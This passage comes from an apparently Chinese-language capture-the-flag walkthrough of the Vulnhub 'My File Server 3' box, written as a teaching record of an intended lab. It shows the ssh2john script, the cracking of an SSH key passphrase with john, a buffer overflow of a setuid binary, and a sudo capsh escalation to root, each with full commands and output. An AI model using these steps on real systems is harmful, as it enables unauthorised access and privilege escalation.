class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> PasswordRequiredException(<span class="string">&#x27;Private key file is encrypted&#x27;</span>)</span><br><span class="line">        cipher = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;cipher&#x27;</span>]</span><br><span class="line">        keysize = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;keysize&#x27;</span>]</span><br><span class="line">        mode = self._CIPHER_TABLE[encryption_type][<span class="string">&#x27;mode&#x27;</span>]</span><br><span class="line">        salt = unhexlify(saltstr)</span><br><span class="line">        <span class="keyword">if</span> self.type == <span class="number">2</span>:</span><br><span class="line">            salt_offset = <span class="number">47</span>  <span class="comment"># XXX is this fixed?</span></span><br><span class="line">            salt_length = <span class="number">16</span></span><br><span class="line">            saltstr = data[salt_offset:salt_offset+salt_length].encode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">        data = binascii.hexlify(data).decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> keysize == <span class="number">24</span>:</span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s&quot;</span> % (f.name, <span class="number">0</span>,</span><br><span class="line">                len(salt), saltstr, len(data) // <span class="number">2</span>, data)</span><br><span class="line">        <span class="keyword">elif</span> keysize == <span class="number">16</span>:</span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s&quot;</span> % (f.name, <span class="number">1</span>, len(saltstr) // <span class="number">2</span>,</span><br><span class="line">                saltstr, len(data) // <span class="number">2</span>, data)</span><br><span class="line">        <span class="keyword">elif</span> keysize == <span class="number">32</span> <span class="keyword">and</span> self.type == <span class="number">2</span>:  <span class="comment"># bcrypt pbkdf + aes-256-cbc</span></span><br><span class="line">            <span class="comment"># round value appears after salt</span></span><br><span class="line">            rounds = <span class="number">16</span></span><br><span class="line">            self.hashline = <span class="string">&quot;%s:$sshng$%s$%s$%s$%s$%s$%d&quot;</span> % (f.name, <span class="number">2</span>, len(saltstr) // <span class="number">2</span>,</span><br><span class="line">                saltstr, len(data) // <span class="number">2</span>, data, rounds)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s uses unsupported cipher, please file a bug!\n&quot;</span> % f.name)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> limited:</span><br><span class="line">            key = generate_key_bytes(MD5, salt, password, keysize)</span><br><span class="line">            data = cipher.new(key, mode, salt).decrypt(data)</span><br><span class="line">            <span class="comment"># check encoding</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                d = PKCS7Encoder()</span><br><span class="line">                ddata = d.decode(data)</span><br><span class="line">                <span class="keyword">return</span> ddata</span><br><span class="line">            <span class="keyword">except</span> ValueError:  <span class="comment"># incorrect password</span></span><br><span class="line">                <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">return</span> self.hashline  <span class="comment"># dummy value</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chunks</span>(<span class="params">l, n</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, len(l), n):</span><br><span class="line">        <span class="keyword">yield</span> l[i:i + n]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RSADSSKey</span> (<span class="params">PKey</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, msg=None, data=None, filename=None, password=None, vals=None, file_obj=None</span>):</span></span><br><span class="line">        self.n = <span class="literal">None</span></span><br><span class="line">        self.e = <span class="literal">None</span></span><br><span class="line">        self.d = <span class="literal">None</span></span><br><span class="line">        self.p = <span class="literal">None</span></span><br><span class="line">        self.q = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> file_obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._from_private_key(file_obj, password)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> filename <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self._from_private_key_file(filename, password)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> vals <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            self.e, self.n = vals</span><br><span class="line">        self.size = bit_length(self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__hash__</span>(<span class="params">self</span>):</span></span><br><span class="line">        h = hash(self.get_name())</span><br><span class="line">        h = h * <span class="number">37</span> + hash(self.e)</span><br><span class="line">        h = h * <span class="number">37</span> + hash(self.n)</span><br><span class="line">        <span class="keyword">return</span> hash(h)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_name</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ssh-rsa&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_bits</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.size</span><br><span class="line"></span><br><span class="line">    <span class="comment">###  internals...</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_private_key_file</span>(<span class="params">self, filename, password</span>):</span></span><br><span class="line">        data = self._read_private_key_file(<span class="string">&#x27;RSA&#x27;</span>, filename, password)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> limited:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="number">0</span>:</span><br><span class="line">                self._decode_key(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._decode_dss_key(data)</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % filename)</span><br><span class="line">        <span class="keyword">except</span> SSHException:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_from_private_key</span>(<span class="params">self, file_obj, password</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;used for converting older format hashes&quot;&quot;&quot;</span></span><br><span class="line">        data = self._read_private_key(<span class="string">&#x27;RSA&#x27;</span>, file_obj, password)</span><br><span class="line">        <span class="keyword">if</span> limited:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> self.type == <span class="number">0</span>:</span><br><span class="line">                self._decode_key(data)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self._decode_dss_key(data)</span><br><span class="line">            sys.stderr.write(<span class="string">&quot;%s has no password!\n&quot;</span> % file_obj.name)</span><br><span class="line">        <span class="keyword">except</span> SSHException:</span><br><span class="line">            sys.stdout.write(<span class="string">&quot;%s\n&quot;</span> % self.hashline)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_decode_key</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># private key file contains:</span></span><br><span class="line">        <span class="comment"># RSAPrivateKey = &#123; version = 0, n, e, d, p, q, d mod p-1, d mod q-1, q**-1 mod p &#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            keylist = BER(data).decode()</span><br><span class="line">        <span class="keyword">except</span> BERException:</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unable to parse key file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> (type(keylist) <span class="keyword">is</span> <span class="keyword">not</span> list) <span class="keyword">or</span> (len(keylist) &lt; <span class="number">4</span>) <span class="keyword">or</span> (keylist[<span class="number">0</span>] != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Not a valid RSA private key file (bad ber encoding)&#x27;</span>)</span><br><span class="line">        self.n = keylist[<span class="number">1</span>]</span><br><span class="line">        self.e = keylist[<span class="number">2</span>]</span><br><span class="line">        self.d = keylist[<span class="number">3</span>]</span><br><span class="line">        <span class="comment"># not really needed</span></span><br><span class="line">        self.p = keylist[<span class="number">4</span>]</span><br><span class="line">        self.q = keylist[<span class="number">5</span>]</span><br><span class="line">        self.size = bit_length(self.n)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_decode_dss_key</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        <span class="comment"># private key file contains:</span></span><br><span class="line">        <span class="comment"># DSAPrivateKey = &#123; version = 0, p, q, g, y, x &#125;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            keylist = BER(data).decode()</span><br><span class="line">        <span class="keyword">except</span> BERException:</span><br><span class="line">            e = sys.exc_info()[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;Unable to parse key file: &#x27;</span> + str(e))</span><br><span class="line">        <span class="keyword">if</span> (type(keylist) <span class="keyword">is</span> <span class="keyword">not</span> list) <span class="keyword">or</span> (len(keylist) &lt; <span class="number">6</span>) <span class="keyword">or</span> \</span><br><span class="line">                (keylist[<span class="number">0</span>] != <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">raise</span> SSHException(<span class="string">&#x27;not a valid DSA private key file (bad ber encoding)&#x27;</span>)</span><br><span class="line">        self.p = keylist[<span class="number">1</span>]</span><br><span class="line">        self.q = keylist[<span class="number">2</span>]</span><br><span class="line">        self.g = keylist[<span class="number">3</span>]</span><br><span class="line">        self.y = keylist[<span class="number">4</span>]</span><br><span class="line">        self.x = keylist[<span class="number">5</span>]</span><br><span class="line">        self.size = bit_length(self.p)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PKCS7Encoder is borrowed from http://japrogbits.blogspot.in/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PKCS7Encoder</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    RFC 2315: PKCS#7 page 21</span></span><br><span class="line"><span class="string">    Some content-encryption algorithms assume the</span></span><br><span class="line"><span class="string">    input length is a multiple of k octets, where k &gt; 1, and</span></span><br><span class="line"><span class="string">    let the application define a method for handling inputs</span></span><br><span class="line"><span class="string">    whose lengths are not a multiple of k octets. For such</span></span><br><span class="line"><span class="string">    algorithms, the method shall be to pad the input at the</span></span><br><span class="line"><span class="string">    trailing end with k - (l mod k) octets all having value k -</span></span><br><span class="line"><span class="string">    (l mod k), where l is the length of the input. In other</span></span><br><span class="line"><span class="string">    words, the input is padded at the trailing end with one of</span></span><br><span class="line"><span class="string">    the following strings:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">             01 -- if l mod k = k-1</span></span><br><span class="line"><span class="string">            02 02 -- if l mod k = k-2</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">                        .</span></span><br><span class="line"><span class="string">          k k ... k k -- if l mod k = 0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The padding can be removed unambiguously since all input is</span></span><br><span class="line"><span class="string">    padded and no padding string is a suffix of another. This</span></span><br><span class="line"><span class="string">    padding method is well-defined if and only if k &lt; 256;</span></span><br><span class="line"><span class="string">    methods for larger k are an open issue for further study.</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, k=<span class="number">16</span></span>):</span></span><br><span class="line">        self.k = k</span><br><span class="line"></span><br><span class="line">    <span class="comment">## @param text The padded text for which the padding is to be removed.</span></span><br><span class="line">    <span class="comment"># @exception ValueError Raised when the input padding is missing or corrupt.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Remove the PKCS#7 padding from a text string</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        nl = len(text)</span><br><span class="line">        val = int(binascii.hexlify(text[<span class="number">-1</span>]), <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> val &gt; self.k:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&#x27;Input is not padded or padding is corrupt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        l = nl - val</span><br><span class="line">        <span class="keyword">return</span> text[:l]</span><br><span class="line"></span><br><span class="line">    <span class="comment">## @param text The text to encode.</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">self, text</span>):</span></span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Pad an input string according to PKCS#7</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        l = len(text)</span><br><span class="line">        output = StringIO()</span><br><span class="line">        val = self.k - (l % self.k)</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(val):</span><br><span class="line">            output.write(<span class="string">&#x27;%02x&#x27;</span> % val)</span><br><span class="line">        <span class="keyword">return</span> text + binascii.unhexlify(output.getvalue())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        sys.stdout.write(<span class="string">&quot;Usage: %s &lt; RSA/DSA private key files &gt;\n&quot;</span> % \</span><br><span class="line">                sys.argv[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> sys.argv[<span class="number">1</span>:]:</span><br><span class="line">        key = RSADSSKey.from_private_key_file(filename, <span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><code>ç ´è§£å¾—åˆ°å¯†ç ä¸ºpassword</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/vulnhub/ck00# vim ssh2john.py</span><br><span class="line">root@JIYE:~/vulnhub/ck00# </span><br><span class="line">root@JIYE:~/vulnhub/ck00# chmod +x ssh2john.py </span><br><span class="line">root@JIYE:~/vulnhub/ck00# ./ssh2john.py id_rsa &gt; id.hash</span><br><span class="line">root@JIYE:~/vulnhub/ck00# ls</span><br><span class="line">id.hash  id_rsa  nmap.CVT  nmap.sP  ssh2john.py  sshd_config</span><br><span class="line">root@JIYE:~/vulnhub/ck00# john id</span><br><span class="line">id.hash  id_rsa   </span><br><span class="line">root@JIYE:~/vulnhub/ck00# john id.hash --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 1 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Note: This format may emit false positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">password         (id_rsa)</span><br><span class="line">Warning: Only 2 candidates left, minimum 4 needed for performance.</span><br><span class="line">1g 0:00:00:03 DONE (2020-09-25 20:47) 0.2754g/s 3950Kp/s 3950Kc/s 3950KC/sa6_123..*7Â¡Vamos!</span><br><span class="line">Session completed</span><br><span class="line">root@JIYE:~/vulnhub/ck00#</span><br></pre></td></tr></table></figure><h2 id="0x09-ç™»å…¥"><a href="#0x09-ç™»å…¥" class="headerlink" title="0x09.ç™»å…¥"></a>0x09.ç™»å…¥</h2><p><code>ä¿®æ”¹id_rsaæƒé™ä¸º600</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~&#x2F;vulnhub&#x2F;ck00# chmod 600 id_rsa </span><br><span class="line">root@JIYE:~&#x2F;vulnhub&#x2F;ck00# ssh -i id_rsa smbuser@192.168.1.14</span><br><span class="line">load pubkey &quot;id_rsa&quot;: invalid format</span><br><span class="line"></span><br><span class="line">   ##############################################################################################</span><br><span class="line">   #                                      InfoSec Warrior                                       #</span><br><span class="line">   #                         --------- www.InfoSecWarrior.com ------------                      #</span><br><span class="line">   #                                    My File Server - 3                                      #</span><br><span class="line">   #                        Just a simple addition to the problem                               #</span><br><span class="line">   #                               Designed By :- CyberKnight                                   #</span><br><span class="line">   #                                Twitter    :- @CyberKnight00                                #</span><br><span class="line">   ##############################################################################################</span><br><span class="line"></span><br><span class="line">Enter passphrase for key &#39;id_rsa&#39;: </span><br><span class="line">Last login: Thu Mar 19 10:15:35 2020 from 192.168.56.1</span><br><span class="line">[smbuser@fileserver ~]$ whoami</span><br><span class="line">smbuser</span><br><span class="line">[smbuser@fileserver ~]$</span><br></pre></td></tr></table></figure><h2 id="0x10-ææƒ"><a href="#0x10-ææƒ" class="headerlink" title="0x10.ææƒ"></a>0x10.ææƒ</h2><p><code>æŸ¥çœ‹ç”¨æˆ·ï¼Œæœ‰ä¸€ä¸ªbla</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ cd /home</span><br><span class="line">[smbuser@fileserver home]$ ls</span><br><span class="line">bla  smbuser</span><br><span class="line">[smbuser@fileserver home]$</span><br></pre></td></tr></table></figure><p><code>æŸ¥æ‰¾åæœŸå®‰è£…è½¯ä»¶çš„è¿è¡Œè„šæœ¬</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver home]$ cd /usr/bin/</span><br><span class="line">[smbuser@fileserver bin]$ ls -la | grep bla</span><br><span class="line">-rwsr-xr-x    1 bla  bla        7546 2æœˆ  27 2020 esclate</span><br><span class="line">[smbuser@fileserver bin]$</span><br></pre></td></tr></table></figure><p><code>ç»è¿‡æŸ¥å‘ç°esclateå­˜åœ¨bufferoverflowï¼ˆç¼“å†²åŒºæº¢å‡ºï¼‰</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1</span><br><span class="line">Why are you here ?!</span><br><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1111111111111111111111111111111111111111111111111111111111</span><br><span class="line">æ®µé”™è¯¯</span><br><span class="line">[smbuser@fileserver bin]$</span><br></pre></td></tr></table></figure><p><code>è¾“å…¥34ä¸ªå­—ç¬¦ï¼Œå³å¯æ­£ç¡®æº¢å‡º</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1111111111111111111111111111111111</span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">bla</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure><p><code>ææƒ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2$ cd /home/bla/</span><br><span class="line">sh-4.2$ ls</span><br><span class="line">user.txt  ynetd</span><br><span class="line">sh-4.2$ cat user.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _____ _ _      ____                                     _____ </span><br><span class="line"> |  ___(_) | ___/ ___|  ___ _ ____   _____ _ __          |___ / </span><br><span class="line"> | |_  | | |/ _ \___ \ / _ \ &#x27;__\ \ / / _ \ &#x27;__|  _____    |_ \ </span><br><span class="line"> |  _| | | |  __/___) |  __/ |   \ V /  __/ |    |_____|  ___) |</span><br><span class="line"> |_|   |_|_|\___|____/ \___|_|    \_/ \___|_|            |____/ </span><br><span class="line">                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Flag : 0aab4a2c6d75db7ca2542e0dacc3a30f</span><br><span class="line"></span><br><span class="line">you can crack this hash, because it is also my pasword</span><br><span class="line"></span><br><span class="line">note: crack it, itiseasy</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure><p><code>æ ¹æ®æç¤ºï¼Œflagå°±æ˜¯blaå¯†ç ,ä¸‹é¢è¿›è¡Œè§£ç </code></p><p><code>è§£ç ä¸ºitiseasy</code></p><img src="/2020/09/26/CK-03/image-20200926095848740.png" class><p><code>ç™»å…¥bla</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2$ su bla</span><br><span class="line">å¯†ç ï¼š</span><br><span class="line">[bla@fileserver ~]$</span><br></pre></td></tr></table></figure><p><code>ææƒï¼Œå¯ä»¥çœ‹åˆ°/usr/sbin/capshä¸éœ€è¦å¯†ç </code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ sudo -l</span><br><span class="line">åŒ¹é…æ­¤ä¸»æœºä¸Š bla çš„é»˜è®¤æ¡ç›®ï¼š</span><br><span class="line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;,</span><br><span class="line">    env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT</span><br><span class="line">    LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS</span><br><span class="line">    _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</span><br><span class="line"></span><br><span class="line">ç”¨æˆ· bla å¯ä»¥åœ¨è¯¥ä¸»æœºä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/capsh, (ALL) /usr/sbin/setcap</span><br><span class="line">[bla@fileserver ~]$</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹/usr/sbin/capshå‚æ•°ï¼Œå¯ä»¥çœ‹åˆ°--ä¸ºé‡æ–°ç”Ÿæˆå‚æ•°/bin/bash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ &#x2F;usr&#x2F;sbin&#x2F;capsh -h</span><br><span class="line">usage: &#x2F;usr&#x2F;sbin&#x2F;capsh [args ...]</span><br><span class="line">  --help         this message (or try &#39;man capsh&#39;)</span><br><span class="line">  --print        display capability relevant state</span><br><span class="line">  --decode&#x3D;xxx   decode a hex string to a list of caps</span><br><span class="line">  --supports&#x3D;xxx exit 1 if capability xxx unsupported</span><br><span class="line">  --drop&#x3D;xxx     remove xxx,.. capabilities from bset</span><br><span class="line">  --caps&#x3D;xxx     set caps as per cap_from_text()</span><br><span class="line">  --inh&#x3D;xxx      set xxx,.. inheritiable set</span><br><span class="line">  --secbits&#x3D;&lt;n&gt;  write a new value for securebits</span><br><span class="line">  --keep&#x3D;&lt;n&gt;     set keep-capabability bit to &lt;n&gt;</span><br><span class="line">  --uid&#x3D;&lt;n&gt;      set uid to &lt;n&gt; (hint: id &lt;username&gt;)</span><br><span class="line">  --gid&#x3D;&lt;n&gt;      set gid to &lt;n&gt; (hint: id &lt;username&gt;)</span><br><span class="line">  --groups&#x3D;g,... set the supplemental groups</span><br><span class="line">  --user&#x3D;&lt;name&gt;  set uid,gid and groups to that of user</span><br><span class="line">  --chroot&#x3D;path  chroot(2) to this path</span><br><span class="line">  --killit&#x3D;&lt;n&gt;   send signal(n) to child</span><br><span class="line">  --forkfor&#x3D;&lt;n&gt;  fork and make child sleep for &lt;n&gt; sec</span><br><span class="line">  &#x3D;&#x3D;             re-exec(capsh) with args as for --</span><br><span class="line">  --             remaing arguments are for &#x2F;bin&#x2F;bash</span><br><span class="line">                 (without -- [&#x2F;usr&#x2F;sbin&#x2F;capsh] will simply exit(0))</span><br><span class="line">[bla@fileserver ~]$ </span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ sudo /usr/sbin/capsh --</span><br><span class="line">[root@fileserver bla]# whoami</span><br><span class="line">root</span><br><span class="line">[root@fileserver bla]# cd</span><br><span class="line">[root@fileserver ~]# ls</span><br><span class="line">proof.txt</span><br><span class="line">[root@fileserver ~]# cat proof.txt </span><br><span class="line">    _______ __    _____                                       _____</span><br><span class="line">   / ____(_) /__ / ___/___  ______   _____  _____            |__  /</span><br><span class="line">  / /_  / / / _ \\__ \/ _ \/ ___/ | / / _ \/ ___/  ______     /_ &lt; </span><br><span class="line"> / __/ / / /  __/__/ /  __/ /   | |/ /  __/ /     /_____/   ___/ / </span><br><span class="line">/_/   /_/_/\___/____/\___/_/    |___/\___/_/               /____/  </span><br><span class="line">                                                                   </span><br><span class="line"></span><br><span class="line">flag : 7be300997079eaebcdf9975ede6746e9</span><br><span class="line">[root@fileserver ~]#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00å®˜ç½‘æè¿°&quot;&gt;&lt;a href=&quot;#0x00å®˜ç½‘æè¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00å®˜ç½‘æè¿°&quot;&gt;&lt;/a&gt;0x00å®˜ç½‘æè¿°&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This box is upgraded edition of previous (MyFileServer 2) box.&lt;/p&gt;
&lt;p&gt;Multiple way to get user and root flags are added.&lt;/p&gt;
&lt;p&gt;Ping me on twitter @CyberKnight00 if you face any difficulty.&lt;/p&gt;
